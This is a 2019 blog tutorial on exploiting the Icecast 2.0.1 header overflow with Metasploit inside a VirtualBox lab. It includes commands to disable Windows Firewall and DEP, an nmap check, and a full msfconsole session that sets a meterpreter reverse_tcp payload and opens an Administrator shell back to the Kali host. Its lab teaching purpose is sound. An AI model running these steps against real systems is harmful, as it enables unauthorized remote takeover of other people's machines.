<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Hugo 0.54.0" />


<title>Exploiting Icecast 2.0.1 with Metasploit - Parker McGee</title>
<meta property="og:title" content="Exploiting Icecast 2.0.1 with Metasploit - Parker McGee">



  






<link rel="stylesheet" href="/css/main.css" media="all">
<link rel="stylesheet" href="/css/fonts.css">

  </head>
  <body>
    <div class="wrapper">
      <header class="header">
        <nav class="nav">
  <a href="/" class="nav-logo">
    Parker McGee
  </a>

  <ul class="nav-links">
    
    <li><a href="/about/">About</a></li>
    
  </ul>
</nav>

      </header>


<main class="content" role="main">
  <article class="article">
    <h1 class="article-title">Exploiting Icecast 2.0.1 with Metasploit</h1>
    
    <span class="article-date">January 10, 2019</span>
    

    
      <nav id="TableOfContents">
<ul>
<li><a href="#setup">Setup</a>
<ul>
<li><a href="#virtual-lab-environment">Virtual Lab Environment</a></li>
<li><a href="#windows">Windows</a>
<ul>
<li><a href="#install-the-virtualbox-guest-additions">Install the VirtualBox Guest Additions</a></li>
</ul></li>
<li><a href="#kali-linux">Kali Linux</a>
<ul>
<li><a href="#install-open-vm-tools">Install Open VM Tools</a></li>
</ul></li>
</ul></li>
<li><a href="#setting-up-icecast">Setting up Icecast</a>
<ul>
<li><a href="#downloading-icecast">Downloading Icecast</a></li>
<li><a href="#disabling-the-windows-firewall">Disabling the Windows Firewall</a></li>
<li><a href="#disabling-data-execution-prevention">Disabling Data Execution Prevention</a></li>
</ul></li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#obtaining-ip-addresses">Obtaining IP Addresses</a></li>
<li><a href="#ensure-the-network-is-setup-properly">Ensure the Network is Setup Properly</a></li>
<li><a href="#starting-metasploit">Starting Metasploit</a></li>
<li><a href="#searching-for-exploits">Searching for Exploits</a></li>
<li><a href="#using-the-icecast-exploit">Using the Icecast Exploit</a></li>
</ul></li>
<li><a href="#wrap-up">Wrap Up</a></li>
</ul>
</nav>
    

    <div class="article-content">
      

<p><a href="http://icecast.org/">Icecast</a> is an streaming media server used to create Internet radio stations. In 2004, a vulnerability was discovered in the way Icecast handles headers. This vulnerability can be used to inject any malicious code an attacker would want to run on a target system. We&rsquo;re going to use it to get access to a computer in our lab environment.</p>

<p>In this first article, I am going to explain how to exploit this vulnerability with Metasploit so you can get your hands dirty quickly with very little technical knowledge. In a future article, I want to look at how to use the proof-of-concept code to exploit the vulnerability and then in another article, we&rsquo;re going to look at how to discover and exploit the vulnerability ourselves.</p>

<h1 id="setup">Setup</h1>

<p>We&rsquo;ll do all this exploitation in a virtualized lab environment that we control. It&rsquo;s an old Windows server, so we&rsquo;ll need a Windows virtual machine (VM) and we&rsquo;ll also need a Kali Linux virtual machine to do the exploitation.</p>

<h2 id="virtual-lab-environment">Virtual Lab Environment</h2>

<p>For the virtual lab environment, install <a href="https://www.virtualbox.org/">Virtualbox</a>. Virtualbox is virtualization software which allows you to run &ldquo;computers&rdquo; inside of your computer, all connected together with a virtualized network. This is great for security research because it enables you to test scenarios that could normally only be tested with multiple computers.</p>

<p>There are many <a href="https://www.youtube.com/watch?v=prP2HWenpmQ">tutorials</a> online for setting up virtual machines with Virtualbox. I&rsquo;ll lay out what virtual machines we need below. To set up a new virtual machine, we need an ISO image, which is the data that would normally appear on an operating system&rsquo;s installation DVD. I provide links on where to download these in the sections below.</p>

<h2 id="windows">Windows</h2>

<p>For Windows, I recommend downloading a trial of Windows Server 2016. This is a time limited trial, limited to 180 days, but that&rsquo;s plenty of time for our use case - and it&rsquo;s free!</p>

<p>To download the Windows Server 2016, <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2016?filetype=ISO">download it from here</a>. Select &ldquo;ISO&rdquo; and then enter the contact information that&rsquo;s requested.</p>

<p>Once the ISO is downloaded, install Windows Server 2016 into Virtualbox, making sure to select the &ldquo;Standard with Desktop Experience&rdquo; option. Setup the network adapter in Virtualbox to attach to the &ldquo;NAT&rdquo; network.</p>

<h3 id="install-the-virtualbox-guest-additions">Install the VirtualBox Guest Additions</h3>

<p><a href="https://www.virtualbox.org/manual/ch04.html">Official Documentation</a></p>

<p>The VirtualBox Guest Additions give Windows the drivers it needs to operate properly inside of VirtualBox with a bunch of useful features, like copying and pasting from the host operating system. Installing these will make your life much easier.</p>

<p>With the virtual machine booted, in the VirtualBox menu, go to &ldquo;Devices&rdquo; -&gt; &ldquo;Install Guest Additions&hellip;&rdquo;. This will load a virtual CD in the guest Windows operating system. Open the CD and run &ldquo;VBoxWindowsAdditions.exe&rdquo;. Complete the dialogs and allow it to reboot the Windows virtual machine.</p>

<h2 id="kali-linux">Kali Linux</h2>

<p><a href="https://www.kali.org/">Kali Linux</a> is a great Linux distribution for penetration testing. It is the defacto standard for many penetration testers in the industry and contains all the tools we need for exploiting the Icecast vulnerability.</p>

<p>To download Kali Linux, <a href="https://www.kali.org/downloads/">download an ISO from here</a>. I highly recommend the &ldquo;Kali Linux Xfce 64 Bit&rdquo; ISO. Xfce is a light weight desktop environment for Linux and performs well in the virtual machine.</p>

<p>Once the ISO is downloaded, install Kali Linux into Virtualbox. Setup the network adapter in Virtualbox to attach to the &ldquo;NAT&rdquo; network.</p>

<h3 id="install-open-vm-tools">Install Open VM Tools</h3>

<p>Kali, and most other Linux distributions, have virtual machine additions similar to what you installed in Windows. Install these now to make your life easier.</p>

<p>Once Kali is installed and booted, open a terminal by going to the &ldquo;Applications&rdquo; menu in the top left (if you downloaded the Xfce ISO) and selecting &ldquo;Terminal Emulator&rdquo;. Inside the terminal, type:</p>

<pre><code># apt install open-vm-tools open-vm-tools-desktop -y
</code></pre>

<p><em>NOTE</em> :: The &lsquo;#&rsquo; at the beginning of the line signifies that you&rsquo;re at a root prompt. You should see this in your prompt. It looks like <code>root@kali:~#</code>. <em>You should not type this <code>#</code>.</em> I will use this convention throughout the rest of the article to denote a root prompt. There will be other prompts which I will point out when we get to them. Keep this in mind throughout the rest of the article.</p>

<p>Once the Open VM Tools have been installed, reboot Kali with this command:</p>

<pre><code># reboot
</code></pre>

<p>Now all your virtual machines should be setup and ready to experiment.</p>

<h1 id="setting-up-icecast">Setting up Icecast</h1>

<p>This vulnerability was patched in version 2.0.2, which means 2.0.1 is the latest version that contains the vulnerability. We need to setup Icecast 2.0.1 on the Windows server so that we can exploit it. Since 2004, Windows has added some mitigations that prevent us from exploiting this (thankfully), so we&rsquo;ll also need to disable those to ensure this works like it did in 2004.</p>

<h2 id="downloading-icecast">Downloading Icecast</h2>

<p>Download Icecast 2.0.1 onto the Windows machine. <a href="http://downloads.xiph.org/releases/icecast/icecast2_win32_2.0.1_setup.exe">You can download it from the official site here.</a>. Install it and reboot. Run it from the desktop shortcut. Click &ldquo;Start Server&rdquo; on the resulting user interface. Icecast should now be listening on port 8000, but if you try to connect to it from the Kali virtual machine, it won&rsquo;t work. You still have two more steps before you can start hacking it.</p>

<h2 id="disabling-the-windows-firewall">Disabling the Windows Firewall</h2>

<p>Modern versions of Windows come with a firewall by default. Firewalls are great because they prevent unexpected ports to be open to the rest of the network to which you&rsquo;re connected. But the Windows Firewalls makes testing Icecast much more difficult. Let&rsquo;s just disable it since this is just an experiment and not a production installation (never, ever do this for a production server!).</p>

<p><img src="/post/icecast-with-metasploit/windows-firewall.png" alt="Windows Firewall" /></p>

<p>Go to the &ldquo;Start Menu&rdquo;, search for &ldquo;Windows Firewall&rdquo;, open the dialog above, click &ldquo;Turn Windows Firewall On or Off&rdquo;, and turn it off.</p>

<h2 id="disabling-data-execution-prevention">Disabling Data Execution Prevention</h2>

<p>In order to exploit the vulnerability in Icecast, we&rsquo;re taking advantage of a buffer overflow vulnerability. That buffer overflow allows us to inject executable binary machine code into the processes memory and then execute it. One way Microsoft has prevented this in modern Windows operating systems is through a feature called Data Execution Prevention, or DEP. DEP prevents the memory address space that should not be executable code from being executed as code. This stops our method of exploiting the Icecast vulnerability by failing to execute the code we inject into the buffer. We need to disable this feature in order to test this exploit.</p>

<p>To turn of DEP, go to the &ldquo;Start Menu&rdquo; and search for &ldquo;cmd&rdquo;. This will bring up the Windows Command Prompt as an option. Right click on it and choose &ldquo;Run as Administrator&rdquo;. Then execute this command:</p>

<pre><code>C:\Windows\system32&gt;bcdedit.exe /set nx AlwaysOff
The operation completed successfully.
</code></pre>

<p>When the command completes successfully, reboot the Windows server. Once the reboot is successful and you have started Icecast again, your Windows server should now be ready to exploit.</p>

<h1 id="exploitation">Exploitation</h1>

<h2 id="obtaining-ip-addresses">Obtaining IP Addresses</h2>

<p>In order to exploit the Windows server, you need to know the IP addresses of both your Windows server and your Kali virtual machine. On Windows, open a Command Prompt again and run:</p>

<pre><code>C:\Users\Administrator&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::f4f5:b63d:e126:5d2b%6
   IPv4 Address. . . . . . . . . . . : 192.168.47.131
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.47.2

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : localdomain

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6ab8:30a5:3671:3f57:d07c
   Link-local IPv6 Address . . . . . : fe80::30a5:3671:3f57:d07c%4
   Default Gateway . . . . . . . . . : ::
</code></pre>

<p>The IP address listed under the &ldquo;IPv4 Address&rdquo; is the network IP address of your Windows server. Document this somewhere because you&rsquo;ll need this later.</p>

<p>On the Kali virtual machine, open a terminal and run:</p>

<pre><code>root@kali:~# ip -c a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
    valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a3:10:27 brd ff:ff:ff:ff:ff:ff
    inet 192.168.47.132/24 brd 192.168.47.255 scope global dynamic noprefixroute eth0
    valid_lft 1738sec preferred_lft 1738sec
    inet6 fe80::20c:29ff:fea3:1027/64 scope link noprefixroute 
    valid_lft forever preferred_lft forever
</code></pre>

<p>The &ldquo;inet&rdquo; address listed under eth0, with the /24 removed, is the Kali Linux network IP address. Document this somewhere because you&rsquo;ll need this later.</p>

<h2 id="ensure-the-network-is-setup-properly">Ensure the Network is Setup Properly</h2>

<p>It&rsquo;s important to test to make sure everything has been setup properly. Otherwise, if this doesn&rsquo;t work, you&rsquo;ll be left scratching your head and wondering what&rsquo;s going on. To test the network, we can use a tool called <code>nmap</code> which tests to see if it&rsquo;s possible to open a network connection from one machine to a port on another. In the Kali virtual machine, run:</p>

<pre><code>root@kali:~# nmap &lt;Windows IP Address&gt; -p 8000
Starting Nmap 7.70 ( [https://nmap.org](https://nmap.org/) ) at 2019-01-04 08:56 EST
Nmap scan report for 192.168.47.131
Host is up (0.00042s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 00:0C:29:73:E9:40 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
</code></pre>

<p>Replace <Windows IP Address> with the IP address you found above. For example, in my setup, I run <code>nmap 192.168.47.131 -p 8000</code>. This sends a TCP network packet on port 8000 from the Kali machine to the machine with the IP address 192.168.47.131. If the machine responds back, nmap knows the port is listening on the target machine and reports the &ldquo;STATE&rdquo; as &ldquo;open&rdquo;. If you do not see &ldquo;open&rdquo; in the output as above, check to make sure that Icecast is running, that the Windows Firewall is disabled, and that both virtual machines are running in the NAT network in Virtualbox.</p>

<h2 id="starting-metasploit">Starting Metasploit</h2>

<p>Metasploit is a penetration testing framework which provides many of the tools you need for penetration testing and exploitation of server vulnerabilities in a really tidy software package. In this tutorial, we&rsquo;ll use Metasploit to exploit the vulnerability in Icecast.</p>

<p>Metasploit can use a database backend to keep track of what&rsquo;s been done, even between restarts of Kali. I recommend you start the database when you start Metasploit. To start the database, open a terminal and run:</p>

<pre><code>root@kali:~# msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
</code></pre>

<p>Then start msfconsole (Metasploit&rsquo;s command line interface) with:</p>

<pre><code>root@kali:~# msfconsole


                _---------.
            .' #######   ;.&quot;
.---,.    ;@             @@`;   .---,..
.&quot; @@@@@'.,'@@            @@@@@',.'@@@@ &quot;.
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
`.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
    &quot;--'.@@@  -.@        @ ,'-   .'--&quot;
        &quot;.@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
            ' @@@ @@   @@    ,
            `.@@@@    @@   .
                ',@@     @   ;           _____________
                (   3 C    )     /|___ / Metasploit! \
                ;@'. __*__,.&quot;    \|--- \_____________/
                '(.,....&quot;/


    =[ metasploit v4.17.17-dev                         ]
+ -- --=[ 1817 exploits - 1031 auxiliary - 315 post       ]
+ -- --=[ 539 payloads - 42 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf &gt;
</code></pre>

<p>The header here is different each time you start Metasploit. It&rsquo;s a cute feature of the msfconsole. Note here that we are getting a new command prompt: <code>msf &gt;</code>. Pay attention to future commands because many of them will start with <code>msf &gt;</code> and should be typed into an msfconsole.</p>

<p>To speed up searching, you can rebuild the cache:</p>

<pre><code>msf &gt; db_rebuild_cache
[*] Purging and rebuilding the module cache in the background...
</code></pre>

<p>Now we&rsquo;re ready to get started.</p>

<h2 id="searching-for-exploits">Searching for Exploits</h2>

<p>In order to use the Icecast exploit in Metasploit, we need to know what it&rsquo;s called. For that, we can use Metasploit&rsquo;s search feature:</p>

<pre><code>msf &gt; search icecast
[!] Module database cache not built yet, using slow search

Matching Modules
================

    Name                                 Disclosure Date  Rank   Description
    ----                                 ---------------  ----   -----------
    exploit/windows/http/icecast_header  2004-09-28       great  Icecast Header Overwrite
</code></pre>

<h2 id="using-the-icecast-exploit">Using the Icecast Exploit</h2>

<p>In the output above, you can see that the exploit we want is called <code>exploit/windows/http/icecast_header</code>. Metasploit gives it the &ldquo;Rank&rdquo; of &ldquo;great&rdquo; which means it&rsquo;s very reliable. This is awesome! Let&rsquo;s try it:</p>

<pre><code>msf &gt; use exploit/windows/http/icecast_header 
msf exploit(windows/http/icecast_header) &gt;
</code></pre>

<p>In order to use most Metasploit exploits, you&rsquo;ll need to set options. You can see the options that are available with the <code>show options</code> command:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; show options

Module options (exploit/windows/http/icecast_header):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    RHOST                   yes       The target address
    RPORT  8000             yes       The target port (TCP)


Exploit target:

    Id  Name
    --  ----
    0   Automatic
</code></pre>

<p>Since this exploit is used to inject machine code (also known as a payload) into a target server, we need to specify the payload we want to use. In this article, I won&rsquo;t get deep into payloads, but know that there are many of them you can explore with many different options. Let&rsquo;s set the meterpreter reverse_tcp payload and see what options it has:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(windows/http/icecast_header) &gt; show options

Module options (exploit/windows/http/icecast_header):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    RHOST                   yes       The target address
    RPORT  8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST                      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


Exploit target:

    Id  Name
    --  ----
    0   Automatic
</code></pre>

<p>Looking at the above output, we can see that we have two required options that are not yet set, RHOST and LHOST. RHOST is the IP of the host you are trying to exploit (the Windows server) and LHOST is the IP of the host where you want the payload to connect (in this case, the IP of the Kali machine). Let&rsquo;s set them. First, let&rsquo;s set LHOST to the IP of the Kali machine:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; set LHOST &lt;IP of Kali machine&gt;
LHOST =&gt; 192.168.47.132
</code></pre>

<p>Now let&rsquo;s set RHOST to the IP of the Windows server:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; set RHOST &lt;IP of Windows server&gt;
RHOST =&gt; 192.168.47.131
</code></pre>

<p>Now let&rsquo;s look at the options one more time:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; show options

Module options (exploit/windows/http/icecast_header):

    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    RHOST  192.168.47.131   yes       The target address
    RPORT  8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
    LHOST     192.168.47.132   yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port


Exploit target:

    Id  Name
    --  ----
    0   Automatic
</code></pre>

<p>Perfect, everything is filled out correctly. Now, let&rsquo;s get to the fun part, let&rsquo;s exploit:</p>

<pre><code>msf exploit(windows/http/icecast_header) &gt; exploit

[*] Started reverse TCP handler on 192.168.47.132:4444 
[*] Sending stage (179779 bytes) to 192.168.47.131
[*] Meterpreter session 1 opened (192.168.47.132:4444 -&gt; 192.168.47.131:49675) at 2019-01-04 09:22:27 -0500

meterpreter &gt;
</code></pre>

<p>Many things just happened. Metasploit sent the exploit to the Windows server along with the meterpreter reverse_tcp payload we specified. At the same time, Metasploit set up a server listening on port 4444 for the payload to call back. When the payload was successfully executed in the Icecast process, the payload reached back to the Kali machine (because its IP address was specified in LHOST) and allowed the Kali machine access to the Windows host through this new meterpreter shell it opened specified by the <code>meterpreter &gt;</code> prompt. Let&rsquo;s check to make sure meterpreter is running on the Windows machine like we expect:</p>

<pre><code>meterpreter &gt; getuid
Server username: WIN-I13ISV85Q18\Administrator
meterpreter &gt; sysinfo
Computer        : WIN-I13ISV85Q18
OS              : Windows 2016 (Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
</code></pre>

<p>You can see from the above output that meterpreter is running as the Administrator user on the Windows server you set up in Virtualbox. Success! You now have full access to the Windows server from your Kali machine and can do generally whatever you want to it.</p>

<h1 id="wrap-up">Wrap Up</h1>

<p>This was a whirlwind tour of Metasploit. I have barely touched the surface of Metasploit and Metasploit is only a tiny portion of penetration testing as a whole. You now have a lab setup with Kali Linux and a Windows server that you can continue to play around with and learn with. Remember that these are just a couple virtual machines. You can snapshot them with Virtualbox and roll back to the snapshot at any time. Go ahead and snapshot them now and go crazy. Read up on the <a href="https://metasploit.help.rapid7.com/docs">Metasploit docs</a> and watch some <a href="https://www.youtube.com/c/MetasploitR7">Metasploit videos</a> to learn more about what Metasploit can do and how it works and try some of it out in your lab. The more you play, the more you learn, and the more you learn the better you&rsquo;ll get.</p>

    </div>
 
    <ul class="article-taxonomy">
      
    
      
  </article>

</main>

      <footer class="footer">
        <ul class="footer-links">
          <li>
            <a href="/index.xml" type="application/rss+xml" target="_blank"><i class="fa fa-rss"></i> RSS feed</a>
          </li>
          <li>
            <a href="https://github.com/pgmcgee"><i class="fa fa-github"></i> Code</a>
          </li>
          <li>
            <a href="https://twitter.com/pgmcgee"><i class="fa fa-twitter"></i> Twitter</a>
          </li>
        </ul>
      </footer>

    </div>

  </body>
</html>

